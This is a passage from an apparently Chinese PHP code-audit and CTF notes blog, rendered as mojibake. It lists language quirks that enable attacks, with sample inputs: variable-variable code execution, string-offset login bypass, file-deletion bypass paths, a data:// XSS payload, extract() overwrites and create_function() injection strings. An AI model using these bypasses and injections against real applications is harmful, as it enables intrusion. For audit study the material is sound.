&amp;&amp; preg_replace</h4><p>æ³¨:è¿™ç§æ¼æ´å¸¸è§äºæ–‡ä»¶ä¸Šä¼ </p><p>explode()ç”¨æ³•:</p><blockquote><p>array explode ( string $delimiter ï¼Œ string $string [ï¼Œ int $limit ] )ï¼Œæ­¤å‡½æ•°è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ string çš„ä¸€ä¸ªå­ä¸²ï¼Œå®ƒä»¬è¢«å­—ç¬¦ä¸² delimiter ä½œä¸ºè¾¹ç•Œç‚¹åˆ†å‰²å‡ºæ¥ã€‚</p></blockquote><p>ç¤ºä¾‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pizza  = &quot;piece1 piece2 piece3 piece4 piece5 piece6&quot;;</span><br><span class="line">$pieces = explode(&quot; &quot;ï¼Œ $pizza);         // å¾—åˆ°æ•°ç»„array(&quot;piece1&quot;ï¼Œ&quot;piece2&quot;ï¼Œ&quot;piece3&quot;ï¼Œ&quot;piece4&quot;ï¼Œ&quot;piece5&quot;ï¼Œ&quot;piece6&quot;)</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°é€ æˆçš„æ¼æ´å…¶å®å°±æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œç”±äºpreg_replace()è¿‡æ»¤äº†ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¼è‡´èƒ½å¤Ÿé€ƒé€¸å‡ºphpè¿™ç§åç¼€ï¼Œè€Œexplode()ç”¨ä»¥å–æ–‡ä»¶åï¼Œæœ€åå–å¾—çš„å°±æ˜¯é”™è¯¯çš„æ–‡ä»¶åç¼€ã€‚</p><p>29~32çš„æ¼æ´å®ä¾‹&amp;å‚è€ƒ:</p><p><a href="https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/" target="_blank" rel="noopener">ã€Šè¿ç»­ä½¿ç”¨è¿‡æ»¤å‡½æ•°é€ æˆçš„å®‰å…¨é—®é¢˜æ€»ç»“ã€‹</a></p><h4 id="33-PHPå¯å˜å˜é‡ä¸å˜é‡æ‰§è¡Œ"><a href="#33-PHPå¯å˜å˜é‡ä¸å˜é‡æ‰§è¡Œ" class="headerlink" title="33.PHPå¯å˜å˜é‡ä¸å˜é‡æ‰§è¡Œ"></a>33.PHPå¯å˜å˜é‡ä¸å˜é‡æ‰§è¡Œ</h4><p>åœ¨èŠ±æ‹¬å·å†…çš„ä»£ç æ˜¯å¯ä»¥æ‰§è¡Œçš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//è¿™ç§å†™æ³•åœ¨php5.4.45ä»¥ä¸‹çš„ç‰ˆæœ¬ä¸­éƒ½æ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œä½†æ˜¯åœ¨ä¹‹åçš„ç‰ˆæœ¬éƒ½æ˜¯å¯è¡Œ</span><br><span class="line">&lt;?php</span><br><span class="line">    &quot;$&#123;phpinfo()&#125;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åœ¨ä»»ä½•phpçš„ç‰ˆæœ¬ä¸­éƒ½å¯ä»¥æ‰§è¡Œçš„æ–¹æ³•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;$&#123; phpinfo()&#125;&quot;; ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºç©ºæ ¼)</span><br><span class="line">&quot;$&#123; phpinfo()&#125;&quot;; ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºtab</span><br><span class="line">&quot;$&#123;/**/phpinfo()&#125;&quot;; ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºæ³¨é‡Š</span><br><span class="line">&quot;$&#123;ã€å›è½¦ã€‘phpinfo()&#125;&quot;; ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦</span><br><span class="line">&quot;$&#123;@phpinfo()&#125;&quot;; ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º@</span><br></pre></td></tr></table></figure><blockquote><p>åŸç†:ç©ºæ ¼ï¼Œtabï¼Œæ³¨é‡Šï¼Œå›è½¦æ˜¯å„ç§è¯­æ³•åˆ†æå¼•æ“ä¸­å¸¸è§çš„åˆ†å‰²å­—ç¬¦ï¼Œ@æ˜¯PHPè¯­æ³•çš„ä¸€ä¸ªç‰¹æ®Šçš„å®¹é”™ç¬¦å·ï¼Œæ‰€ä»¥å¯å˜å˜é‡å†…çš„èŠ±æ‹¬å·æœ‰è¿™ä¹ˆä¸€ä¸ªè§„åˆ™ï¼Œéœ€è¦åˆ¤æ–­èŠ±æ‹¬å·å†…çš„å†…å®¹æ˜¯å¦ä¸ºçœŸæ­£çš„ä»£ç ï¼Œæ¡ä»¶å³æ˜¯æ–‡æœ¬çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºPHPè¯­æ³•è§£æå¼•æ“çš„åˆ†å‰²å­—ç¬¦å’Œç‰¹æ®Šçš„è¯­æ³•ç¬¦å·ï¼</p></blockquote><p>å‚è€ƒ:</p><p><a href="https://blog.spoock.com/2017/07/18/php-variables-variable/" target="_blank" rel="noopener">ã€ŠPHPå¯å˜å˜é‡ç®€ä»‹ä»¥åŠå®‰å…¨æ€§é—®é¢˜åˆ†æã€‹</a></p><h4 id="34-PHP-String-Offset"><a href="#34-PHP-String-Offset" class="headerlink" title="34.PHP String Offset"></a>34.PHP String Offset</h4><p>å…³äºå­—ç¬¦ä¸²offsetå–å€¼ç‰¹æ€§çš„ä¸€æ®µæè¿°[è¯¦è§[2]]:</p><blockquote><p>String access and modification by character</p><p>Characters within strings may be accessed and modified by specifying the<br>zero-based offset of the desired character after the string using square array<br>brackets, as in $str[42]. Think of a string as an array of characters for this<br>purpose. The functions substr() and substr_replace() can be used when you want<br>to extract or replace more than 1 character.</p><p>Note: Strings may also be accessed using braces, as in $str{42}, for the same purpose. </p></blockquote><p>è¯´ç™½äº†å°±æ˜¯phpä¸­çš„å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥åƒæ•°ç»„ä¸€æ ·è¿›è¡Œå–å€¼ã€‚æ¯”å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test = &quot;hello world&quot;;</span><br><span class="line">echo $test[0];</span><br><span class="line">//h</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å®ƒçš„è‡ªåŠ¨è½¬æ¢é—®é¢˜å†³å®šäº†ä¸‹é¢çš„è¾“å‡ºä¹Ÿæ˜¯h:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//passè¢«è‡ªåŠ¨è½¬æ¢ä¸º0</span><br><span class="line">//å¦‚æœæ˜¯1passå°±ä¼šè¢«è‡ªåŠ¨è½¬æ¢ä¸º1</span><br><span class="line">$mystr = &quot;hello world&quot;;</span><br><span class="line">echo $mystr[&quot;pass&quot;];</span><br></pre></td></tr></table></figure><p>æ¼æ´ç¤ºä¾‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//ä¸‹é¢è¿™æ®µä»£ç æ˜¯åœ¨åœ¨phpspy2006ä¸­ç”¨äºåˆ¤æ–­ç™»å½•æ—¶æ‰€ä½¿ç”¨çš„ä»£ç </span><br><span class="line">$admin[&apos;check&apos;] = &quot;1&quot;;</span><br><span class="line">$admin[&apos;pass&apos;]  = &quot;angel&quot;;</span><br><span class="line">......</span><br><span class="line">if($admin[&apos;check&apos;] == &quot;1&quot;) &#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„éªŒè¯é€»è¾‘å¦‚æœåˆ©ç”¨ä¸Šè¿°çš„ç‰¹æ€§å°±å¾ˆå®¹æ˜“åœ°å°±å¯ä»¥è¢«ç»•è¿‡ã€‚$adminæ²¡æœ‰è¢«åˆå§‹å®šä¹‰ä¸ºæ•°ç»„ç±»å‹ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ç”¨å­—ç¬¦ä¸²æäº¤æ—¶phpsyp.php?admin=1abcæ—¶ï¼Œphpä¼šå–å­—ç¬¦ä¸²1xxxçš„ç¬¬ä¸€ä½ï¼ŒæˆåŠŸç»•è¿‡ifçš„æ¡ä»¶åˆ¤æ–­ã€‚</p><p>ä¸ä¹‹ç±»ä¼¼çš„è¿˜æœ‰php4funä¸­çš„ç¬¬äº”é¢˜</p><p>å‚è€ƒ:</p><p><a href="https://blog.spoock.com/2017/07/07/php-offset/" target="_blank" rel="noopener">ã€Šç”±php offsetç‰¹å¾é€ æˆçš„ç»•è¿‡æ¼æ´ã€‹</a></p><h4 id="35-switch"><a href="#35-switch" class="headerlink" title="35.switch"></a>35.switch</h4><p>å¦‚æœswitchæ˜¯æ•°å­—ç±»å‹çš„caseçš„åˆ¤æ–­æ—¶ï¼Œswitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸ºintç±»å‹ã€‚å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$i =&quot;2abc&quot;;</span><br><span class="line">switch ($i) &#123;</span><br><span class="line">case 0:</span><br><span class="line">case 1:</span><br><span class="line">case 2:</span><br><span class="line">    echo &quot;i is less than 3 but not negative&quot;;</span><br><span class="line">    break;</span><br><span class="line">case 3:</span><br><span class="line">    echo &quot;i is 3&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//è¾“å‡ºi is less than 3 but not negative</span><br></pre></td></tr></table></figure><h4 id="36-file-put-contents-amp-amp-unlink"><a href="#36-file-put-contents-amp-amp-unlink" class="headerlink" title="36.file_put_contents&amp;&amp;unlink"></a>36.file_put_contents&amp;&amp;unlink</h4><p>æ­¤å¤„æŒ‡ä»£file_put_contentsã€copyã€file_get_contentsç­‰è¯»å–å†™å…¥æ“ä½œä¸unlinkã€file_existsç­‰åˆ é™¤åˆ¤æ–­æ–‡ä»¶å‡½æ•°ä¹‹é—´å¯¹äºè·¯å¾„å¤„ç†çš„å·®å¼‚å¯¼è‡´çš„åˆ é™¤ç»•è¿‡</p><p>ç¤ºä¾‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;];</span><br><span class="line">$data = $user[&apos;info&apos;];</span><br><span class="line"></span><br><span class="line">file_put_contents($filename, $data);</span><br><span class="line">if (file_exists($filename)) &#123;</span><br><span class="line">unlink($filename);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ´å¼•è‡ªPç‰›:</p><blockquote><p>æŸ¥çœ‹phpæºç ï¼Œå…¶å®æˆ‘ä»¬èƒ½å‘ç°ï¼Œphpè¯»å–ã€å†™å…¥æ–‡ä»¶ï¼Œéƒ½ä¼šè°ƒç”¨php_stream_open_wrapper_exæ¥æ‰“å¼€æµï¼Œè€Œåˆ¤æ–­æ–‡ä»¶å­˜åœ¨ã€é‡å‘½åã€åˆ é™¤æ–‡ä»¶ç­‰æ“ä½œåˆ™æ— éœ€æ‰“å¼€æ–‡ä»¶æµã€‚</p><p>æˆ‘ä»¬è·Ÿä¸€è·Ÿphp_stream_open_wrapper_exå°±ä¼šå‘ç°ï¼Œå…¶å®æœ€åä¼šä½¿ç”¨tsrm_realpathå‡½æ•°æ¥å°†filenameç»™æ ‡å‡†åŒ–æˆä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚è€Œæ–‡ä»¶åˆ é™¤ç­‰æ“ä½œåˆ™ä¸ä¼šï¼Œè¿™å°±æ˜¯äºŒè€…çš„åŒºåˆ«ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ˜¯æ–‡ä»¶åä¸­åŒ…å«ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ï¼Œå†™å…¥çš„æ—¶å€™å› ä¸ºä¼šå¤„ç†æ‰â€œ../â€ç­‰ç›¸å¯¹è·¯å¾„ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºé”™ï¼›åˆ¤æ–­ã€åˆ é™¤çš„æ—¶å€™å› ä¸ºä¸ä¼šå¤„ç†ï¼Œæ‰€ä»¥å°±ä¼šå‡ºç°â€œNo such file or directoryâ€çš„é”™è¯¯ã€‚</p></blockquote><p>å› æ­¤linuxå¯ä»¥é€šè¿‡xxxxx/../test.phpã€test.php/. windowså¯ä»¥é€šè¿‡test.php:test test.ph&lt;æ¥ç»•è¿‡æ–‡ä»¶åˆ é™¤</p><p>æ­¤å¤–å‘ç°è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®php://filter/resource=1.phpåœ¨file_ge_contentsã€copyç­‰ä¸­è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå´å¯ä»¥ç»•è¿‡æ–‡ä»¶åˆ é™¤</p><h4 id="37-æµ®ç‚¹æ•°é—®é¢˜"><a href="#37-æµ®ç‚¹æ•°é—®é¢˜" class="headerlink" title="37.æµ®ç‚¹æ•°é—®é¢˜"></a>37.æµ®ç‚¹æ•°é—®é¢˜</h4><p>å½“å°æ•°å°äº10^-16åï¼ŒPHPå¯¹äºå°æ•°çš„åˆ¤æ–­å°±å‡ºç°é—®é¢˜äº†ï¼ŒPHP7ä¹Ÿæ˜¯å¦‚æ­¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE</span><br><span class="line"></span><br><span class="line">var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE</span><br></pre></td></tr></table></figure><h4 id="38-filter-var-amp-parse-url-gt-ssrf"><a href="#38-filter-var-amp-parse-url-gt-ssrf" class="headerlink" title="38.filter_var&amp;parse_url=&gt;ssrf"></a>38.filter_var&amp;parse_url=&gt;ssrf</h4><p>å‚è€ƒ:</p><p><a href="https://www.anquanke.com/post/id/101058/" target="_blank" rel="noopener">ã€ŠSSRFæŠ€å·§ä¹‹å¦‚ä½•ç»•è¿‡filter_var( )ã€‹</a></p><h4 id="39-file-get-contents"><a href="#39-file-get-contents" class="headerlink" title="39.file_get_contents"></a>39.file_get_contents</h4><p>é€šè¿‡file_get_contentsè·å–ç½‘é¡µå†…å®¹å¹¶è¿”å›åˆ°å®¢æˆ·ç«¯æœ‰å¯èƒ½é€ æˆxss</p><p>ä¾‹å¦‚å¦‚ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">   // parse URL</span><br><span class="line">   $r = parse_url($argv[1]);</span><br><span class="line">   print_r($r);</span><br><span class="line">   // check if host ends with google.com</span><br><span class="line">   if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123;</span><br><span class="line">      // get page from URL</span><br><span class="line">      $a = file_get_contents($argv[1]);</span><br><span class="line">      echo($a);</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">   echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶é€šè¿‡filter_varå‡½æ•°å¯¹urlçš„æ ¼å¼è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶ä¸”ä½¿ç”¨æ­£åˆ™å¯¹urlçš„hostè¿›è¡Œé™å®š</p><p>ä½†æ˜¯å¯ä»¥é€šè¿‡<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code> é¡µé¢ä¼šå°†<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå°±æœ‰å¯èƒ½é€ æˆxss</p><h4 id="40-æ•æ„Ÿé…ç½®é¡¹"><a href="#40-æ•æ„Ÿé…ç½®é¡¹" class="headerlink" title="40.æ•æ„Ÿé…ç½®é¡¹"></a>40.æ•æ„Ÿé…ç½®é¡¹</h4><p><strong>1.register_globals</strong></p><p>phpç‰ˆæœ¬å°äº5.4æ—¶å­˜åœ¨</p><p>å½“è¯¥é…ç½®é¡¹ä¸ºONæ—¶ï¼Œä¼šæŠŠç”¨æˆ·é€šè¿‡GETã€POSTæäº¤çš„å‚æ•°è‡ªåŠ¨æ³¨å†Œæˆå…¨å±€å˜é‡ã€‚å½“ä»£ç ä¸­å­˜åœ¨æœ‰æœªåˆå§‹åŒ–çš„å˜é‡æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´å˜é‡è¦†ç›–çš„é—®é¢˜</p><p>æ³¨:å…¶ä¸­å‚æ•°è¦†ç›–çš„é¡ºåºå—åˆ°é…ç½®æ–‡ä»¶ä¸­variables_orderçš„å‚æ•°å½±å“ï¼Œé»˜è®¤æ˜¯EGPCSã€‚æŒ‰é¡ºåºï¼Œå³è¾¹çš„å‚æ•°æ¥æºä¼šè¦†ç›–å·¦è¾¹çš„çš„å‚æ•°æ¥æº</p><p><strong>2.allow_url_include</strong></p><p>phpç‰ˆæœ¬å¤§äº5.2é»˜è®¤ä¸ºoff</p><p>å½“è¯¥é…ç½®é¡¹ä¸ºONæ—¶ï¼Œå¯ä»¥é€šè¿‡includeã€requireç­‰å‡½æ•°è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«</p><p>ç±»ä¼¼çš„è¿˜æœ‰allow_url_fopenï¼Œè¿™ä¸ªå‚æ•°é…ç½®ä¸ºonçš„æ—¶å€™å¯ä»¥ä½¿ç”¨file_get_contentså‡½æ•°æ‰“å¼€url</p><p>allow_url_includeå’Œallow_url_fopenå½“ä¸¤ä¸ªé…ç½®é¡¹éƒ½ä¸ºONçš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨urlè¿›è¡Œè¿œç¨‹åŒ…å«ï¼Œå½“includeä¸ºONï¼Œfopenä¸ºOFFæ—¶ï¼Œåªèƒ½é€šè¿‡phpä¼ªåè®®è¿›è¡ŒåŒ…å«</p><p><strong>3.magic_quato_gpc</strong></p><p>phpç‰ˆæœ¬å°äº5.4å­˜åœ¨</p><p>æ­¤é…ç½®é¡¹ä¸ºONçš„æ—¶å€™ä¼šå¯¹GETã€POSTã€COOKIEå˜é‡ä¸­çš„å•å¼•å·(â€˜)ã€åŒå¼•å·(â€œ)ã€åæ–œæ ï¼ˆ\ï¼‰ã€ç©ºå­—ç¬¦(NULL)å‰æ·»åŠ åæ–œæ è¿›è¡Œè½¬ä¹‰ã€‚</p><p>æ³¨æ„ï¼šè¿™ä¸ªé…ç½®å¹¶ä¸ä¼šå¯¹SERVERå˜é‡é‡Œçš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå› æ­¤å¯èƒ½ä¼šå¯¼è‡´refererã€client-ipå­˜åœ¨æ³¨å…¥ç­‰æ¼æ´</p><p><strong>4.magic_quato_runtime</strong></p><p>phpç‰ˆæœ¬å°äº5.4å­˜åœ¨</p><p>è¿™ä¸ªé…ç½®å’Œmagic_quato_gpcçš„åŒºåˆ«å°±åœ¨äºruntimeæ˜¯å¯¹ä»æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­å–å‡ºçš„æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œå› æ­¤åªå¯¹ä¾‹å¦‚file()ã€fgets()ã€freadï¼ˆï¼‰ã€mysql_fetch_arrayï¼ˆï¼‰ç­‰å¾ˆå¤šå¯¹æ•°æ®åº“æŸ¥è¯¢å’Œæ–‡ä»¶è¯»å–çš„å‡½æ•°äº§ç”Ÿå½±å“</p><p><strong>5.magic_quato_sybase</strong></p><p>phpç‰ˆæœ¬å°äº5.4å­˜åœ¨</p><p>è¿™ä¸ªé…ç½®å’Œmagic_quato_gpc çš„åŒºåˆ«åœ¨äºï¼Œsybaseåªä¼šè½¬ä¹‰ç©ºå­—ç¬¦ï¼ŒæŠŠå•å¼•å·è½¬ä¸ºåŒå¼•å·ï¼Œå¹¶ä¸”è¿™ä¸ªé…ç½®å¦‚æœä¸ºONä¼šè¦†ç›–gpcçš„é…ç½®</p><p><strong>6.open_basedir</strong></p><p>è¿™ä¸ªé…ç½®ç”¨æ¥è®¾ç½®é™å®šphpç¨‹åºåªèƒ½è®¿é—®å“ªäº›ç›®å½•ã€‚åœ¨windowsä¸‹ï¼Œå¤šä¸ªç›®å½•ç”¨åˆ†å·ï¼ˆ;ï¼‰åˆ†å‰²ï¼Œlinuxä¸‹ç”¨å†’å·(:)è¿›è¡Œåˆ†å‰²ã€‚æ³¨æ„çš„æ˜¯é…ç½®çš„ç›®å½•éœ€è¦ç”¨æ–œæ ï¼ˆ/ï¼‰è¿›è¡Œå°å°¾ï¼Œå¦åˆ™å°±å˜æˆäº†å‰ç¼€åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œé…ç½®/var/testï¼Œé‚£ä¹ˆ/var/testå’Œ/var/test123éƒ½æ˜¯å¯ä»¥è¿›è¡Œè®¿é—®çš„ï¼Œå¦‚æœæŒ‡å®šä¸€ä¸ªç¡®å®šçš„ç›®å½•å°±è¦å†™æˆ/var/test/</p><p>å‚è€ƒ:<a href="https://hacksec.xyz/2018/03/21/Code-audit/" target="_blank" rel="noopener">ã€ŠPHPä»£ç å®¡è®¡å°ç»“ã€‹</a></p><h3 id="41-parse-url"><a href="#41-parse-url" class="headerlink" title="41.parse_url"></a>41.parse_url</h3><p> <code>parse_url</code> å‡½æ•°åœ¨è§£æ url æ—¶å­˜åœ¨çš„bugï¼Œé€šè¿‡ï¼š<code>////x.php?key=value</code> çš„æ–¹å¼å¯ä»¥ä½¿å…¶è¿”å›Falseã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros î‚° ~ î‚° uname -a</span><br><span class="line">Darwin zeros.local 17.7.0 Darwin Kernel Version 17.7.0: Thu Jun 21 22:53:14 PDT 2018; root:xnu-4570.71.2~1/RELEASE_X86_64 x86_64</span><br><span class="line"> zeroyu@zeros î‚° ~ î‚° php -v</span><br><span class="line">PHP 7.1.16 (cli) (built: Mar 31 2018 02:59:59) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line"> zeroyu@zeros î‚° ~ î‚° php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(parse_url(&apos;///x.php?key=value&apos;));</span><br><span class="line">bool(false)</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure><p>å‚è€ƒ:<a href="https://note.youdao.com/http://mxny.org/post/ctf/2016-11-10" target="_blank" rel="noopener">ã€Šè·¨æ¬¡å…ƒCTFã€‹</a></p><h3 id="42"><a href="#42" class="headerlink" title="42.$"></a>42.$</h3><p>$$key = $value;ä¸­keyæœ‰ä¸¤ä¸ª$,è¿™ä¼šè·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼å°±æˆäº†å˜é‡çš„å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">"meizijiu233"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure><h3 id="43-extract"><a href="#43-extract" class="headerlink" title="43.extract"></a>43.extract</h3><p>å¯èƒ½å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;$a = $a; $b = $b; $c = $c&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($gift)) &#123;</span><br><span class="line">    $content = trim($flag);</span><br><span class="line">    <span class="keyword">if</span> ($gift == $content) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=&amp;gift=</span><br></pre></td></tr></table></figure><h3 id="44-create-function"><a href="#44-create-function" class="headerlink" title="44.create_function"></a>44.create_function</h3><p>ä¸ç”¨åˆ›å»ºæ–°å‡½æ•°æ¥è¾¾åˆ°æ‰§è¡Œçš„ç›®çš„ï¼Œç›´æ¥ä½¿ç”¨å¦‚ä¸‹ä»£ç è¾¾åˆ°RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">''</span>, $_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure><p>å…·ä½“åœºæ™¯ä¸­çš„ç»•è¿‡é—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. å¦‚æœå¯æ§åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆåœ†æ‹¬å·å’Œå¤§æ‹¬å·ï¼šcreate_function(&apos;)&#123;&#125;phpinfo();//&apos;, &apos;&apos;);</span><br><span class="line">2. å¦‚æœå¯æ§åœ¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆå¤§æ‹¬å·ï¼šcreate_function(&apos;&apos;, &apos;&#125;phpinfo();//&apos;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-eregi&quot;&gt;&lt;a href=&quot;#1-eregi&quot; class=&quot;headerlink&quot; title=&quot;1.eregi&quot;&gt;&lt;/a&gt;1.eregi&lt;/h4&gt;&lt;p&gt;æ­¤å‡½æ•°å¯ä»¥è¢«%00æˆªæ–­&lt;/p&gt;
